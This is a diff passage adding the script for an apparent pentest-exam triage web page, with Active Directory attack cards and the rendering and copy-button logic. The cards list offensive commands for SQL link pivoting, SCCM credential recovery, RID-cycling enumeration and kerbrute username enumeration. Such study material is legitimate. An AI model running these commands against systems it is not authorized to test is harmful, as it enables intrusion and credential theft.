+  { id:"a-sqllinks", os:"ad", prio:"med", title:"MSSQL linked servers & domain pivot",
+    why:"Trusted links between SQL servers let you execute across hosts, chaining db access into command execution on another machine.",
+    kw:["linked server","sp_linkedservers","openquery","EXECUTE AT","MSSQL"],
+    cmds:[{t:"# PowerUpSQL: Get-SQLServerLinkCrawl -Instance <host>",cmt:1},{t:"SELECT * FROM openquery(\"LINKED\", 'select @@version')"}],
+    note:"Link crawls can reach a sysadmin context on a server you couldn't touch directly. Useful pivot when a SQL box is your initial foothold." },
+  { id:"a-sccm", os:"ad", prio:"med", title:"SCCM / MECM — Network Access Account creds",
+    why:"SCCM stores client-reachable Network Access Account credentials that are recoverable and often broadly privileged.",
+    kw:["SCCM","MECM","Network Access Account","NAA","CIM"],
+    cmds:[{t:"# SharpSCCM / sccmhunter to locate the site & recover NAA creds",cmt:1}],
+    note:"Increasingly common in enterprise images. NAA creds frequently reuse across many hosts — a quiet, high-value find when SCCM is present." },
+  { id:"a-nullsession", os:"ad", prio:"low", title:"Null/anonymous session & RID cycling",
+    why:"Anonymous SMB/LDAP can leak the user list, password policy, and group memberships to seed roasting and spraying.",
+    kw:["null session","anonymous","RID cycling","enum4linux","rpcclient"],
+    cmds:[{t:"enum4linux-ng -A <DC>"},{t:"crackmapexec smb <DC> -u '' -p '' --rid-brute"}],
+    note:"Free recon before you have creds. The user list it yields feeds AS-REP roasting and policy-aware spraying — do this first." },
+  { id:"a-userenum", os:"ad", prio:"low", title:"Kerberos username enumeration (kerbrute)",
+    why:"Kerbrute validates usernames via Kerberos pre-auth errors without logging failed logons — builds a clean target list.",
+    kw:["kerbrute","userenum","KDC_ERR","valid user"],
+    cmds:[{t:"kerbrute userenum -d domain --dc <DC> users.txt"}],
+    note:"Quiet way to confirm which names are real before AS-REP/spray. Pair with the null-session dump and a seclists username wordlist." },
+  { id:"a-zerologon", os:"ad", prio:"waste", title:"Zerologon / automated 'one-shot' DC exploits",
+    why:"Zerologon (CVE-2020-1472) resets the DC machine password and can break the domain; it's destructive and usually out of scope.",
+    kw:["Zerologon","CVE-2020-1472","Netlogon","reset machine password"],
+    cmds:[{t:"# can break AD replication/auth — most exams forbid it; verify scope before ever touching it",cmt:1}],
+    note:"Powerful in real engagements but it can brick the DC and is typically prohibited on exams. Know it exists; don't reach for it by default." },
+  { id:"a-persistence", os:"ad", prio:"waste", title:"Golden/Silver/Diamond tickets & DCShadow (persistence)",
+    why:"These are post-domain-admin persistence techniques, not escalation — building them before you own the domain wastes time.",
+    kw:["golden ticket","silver ticket","diamond","DCShadow","krbtgt"],
+    cmds:[{t:"# only relevant AFTER you have krbtgt / DA — persistence, not a path to DA",cmt:1}],
+    note:"Useful to understand, rarely needed to pass. Get domain admin by a real path first; tickets are what you'd do afterward to persist." },
+];
+
+/* ---------------- STATE ---------------- */
+const STORE = "peas-triage-v1";
+let os = "lin";
+let activeFilter = "all";
+let checked = {};
+try { checked = JSON.parse(localStorage.getItem(STORE)) || {}; } catch(e){ checked = {}; }
+
+function save(){ try { localStorage.setItem(STORE, JSON.stringify(checked)); } catch(e){} }
+
+/* ---------------- RENDER ---------------- */
+const board = document.getElementById("board");
+const filtersEl = document.getElementById("filters");
+
+function visibleItems(){
+  return ITEMS.filter(i => i.os === os || i.os === "both");
+}
+
+function renderFilters(){
+  const items = visibleItems();
+  let html = `<button class="chip" data-f="all" aria-pressed="${activeFilter==='all'}">
+      <span class="n">${items.length}</span> All</button>`;
+  PRIOS.forEach(p => {
+    const n = items.filter(i => i.prio === p.id).length;
+    if(!n) return;
+    html += `<button class="chip" data-f="${p.id}" aria-pressed="${activeFilter===p.id}" style="--c:${p.color}">
+        <span class="dot" style="background:${p.color}"></span>${p.label}<span class="n">${n}</span></button>`;
+  });
+  filtersEl.innerHTML = html;
+  filtersEl.querySelectorAll(".chip").forEach(c => {
+    c.style.color = (c.dataset.f===activeFilter && activeFilter!=='all') ? c.style.getPropertyValue('--c') : "";
+    c.onclick = () => { activeFilter = c.dataset.f; renderFilters(); renderBoard(); };
+  });
+}
+
+function esc(s){ return s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;"); }
+
+function termBlock(cmds){
+  const lines = cmds.map(c => {
+    if(c.cmt) return `<span class="line cmt">${esc(c.t)}</span>`;
+    const cls = c.c ? "line c" : "line";
+    return `<span class="${cls}">${esc(c.t)}</span>`;
+  }).join("");
+  const raw = cmds.filter(c=>!c.cmt).map(c=>c.t).join("\n");
+  return `<div class="term"><button class="copy" data-cmd="${esc(raw)}">Copy</button>${lines}</div>`;
+}
+
+function renderBoard(){
+  const items = visibleItems();
+  board.innerHTML = "";
+  PRIOS.forEach(p => {
+    if(activeFilter!=='all' && activeFilter!==p.id) return;
+    const list = items.filter(i => i.prio === p.id);
+    if(!list.length) return;
+    const band = document.createElement("section");
+    band.className = "band";
+    band.style.setProperty("--band-color", p.color);
+    band.style.setProperty("--band-soft", p.soft);
+    band.innerHTML = `
+      <div class="band-head">
+        <span class="band-stripe" style="background:${p.color}"></span>
+        <h2>${p.label}</h2>
+        <span class="tag" style="background:${p.soft};color:${p.color}">${p.tag}</span>
+      </div>
+      <p class="band-desc">${p.desc}</p>`;
+    list.forEach(i => band.appendChild(card(i,p)));
+    board.appendChild(band);
+  });
+  updateProgress();
+}
+
+function card(i,p){
+  const el = document.createElement("article");
+  const isDone = !!checked[i.id];
+  el.className = "card" + (isDone?" done":"");
+  el.style.setProperty("--band-color", p.color);
+  el.style.setProperty("--band-soft", p.soft);
+
+  const kwHtml = i.kw && i.kw.length
+    ? `<div class="field"><div class="field-label">▸ Keywords to grep in the output</div>
+         <div class="kw">${i.kw.map(k=>`<code>${esc(k)}</code>`).join("")}</div></div>` : "";
+  const cmdHtml = i.cmds && i.cmds.length
+    ? `<div class="field"><div class="field-label">▸ Manual validation</div>${termBlock(i.cmds)}</div>` : "";
+  const noteHtml = i.note
+    ? `<div class="field"><div class="note">${i.note.replace(/\b(validate|validation|BOTH|THE path|manual)\b/g,'<strong>$1</strong>')}</div></div>` : "";
+
+  el.innerHTML = `
+    <div class="card-top">
+      <input type="checkbox" class="cbox" id="cb-${i.id}" ${isDone?"checked":""} aria-label="Mark ${esc(i.title)} reviewed">
+      <div class="card-main">
+        <p class="card-title">${esc(i.title)}</p>
+        <p class="card-why">${esc(i.why)}</p>
+      </div>
+      <span class="expand">▸</span>
+    </div>
+    <div class="card-body">${kwHtml}${cmdHtml}${noteHtml}</div>`;
+
+  const cb = el.querySelector(".cbox");
+  cb.addEventListener("click", e => e.stopPropagation());
+  cb.addEventListener("change", () => {
+    if(cb.checked) checked[i.id]=true; else delete checked[i.id];
+    el.classList.toggle("done", cb.checked);
+    save(); updateProgress();
+  });
+  el.querySelector(".card-top").addEventListener("click", () => el.classList.toggle("open"));
+  return el;
+}
+
+function updateProgress(){
+  const items = visibleItems();
+  const done = items.filter(i => checked[i.id]).length;
+  const total = items.length;
+  const pctN = total ? Math.round(done/total*100) : 0;
+  document.getElementById("barFill").style.width = pctN + "%";
+  document.getElementById("pct").textContent = `${done} / ${total}`;
+}
+
+/* copy (delegated) */
+board.addEventListener("click", e => {
+  const btn = e.target.closest(".copy");
+  if(!btn) return;
+  e.stopPropagation();
+  const text = btn.dataset.cmd;
+  const done = () => { btn.textContent="Copied"; btn.classList.add("ok"); setTimeout(()=>{btn.textContent="Copy";btn.classList.remove("ok");},1300); };
+  if(navigator.clipboard && navigator.clipboard.writeText){
+    navigator.clipboard.writeText(text).then(done).catch(()=>fallbackCopy(text,done));
+  } else fallbackCopy(text,done);
+});
+function fallbackCopy(text,cb){
+  const ta=document.createElement("textarea"); ta.value=text; ta.style.position="fixed"; ta.style.opacity="0";
+  document.body.appendChild(ta); ta.select();
+  try{ document.execCommand("copy"); cb(); }catch(e){} document.body.removeChild(ta);
+}
+
+/* OS toggle */
+const osLin=document.getElementById("osLin"), osWin=document.getElementById("osWin"), osAd=document.getElementById("osAd");
+function setOS(next){
+  os=next;
+  osLin.setAttribute("aria-pressed", os==="lin");
+  osWin.setAttribute("aria-pressed", os==="win");
+  osAd.setAttribute("aria-pressed", os==="ad");
+  activeFilter="all";
+  renderFilters(); renderBoard();
+}
+osLin.onclick=()=>setOS("lin");
+osWin.onclick=()=>setOS("win");
+osAd.onclick=()=>setOS("ad");
+
+/* compact / quick-scan toggle */
+const compactBtn=document.getElementById("compactBtn");
+compactBtn.onclick=()=>{
+  const on=document.body.classList.toggle("compact");
+  compactBtn.setAttribute("aria-pressed", on);
+};
+
+/* theme toggle */
+const themeBtn=document.getElementById("themeBtn");
+themeBtn.onclick=()=>{
+  const root=document.documentElement;
+  const isDark=root.getAttribute("data-theme")==="dark" ||
+    (!root.getAttribute("data-theme") && matchMedia("(prefers-color-scheme: dark)").matches);
+  root.setAttribute("data-theme", isDark?"light":"dark");
+};
+
+/* reset */
+document.getElementById("resetBtn").onclick=()=>{
+  checked={}; save(); renderBoard();
+};
+
+renderFilters();
+renderBoard();
+</script>
+
+</body></html>
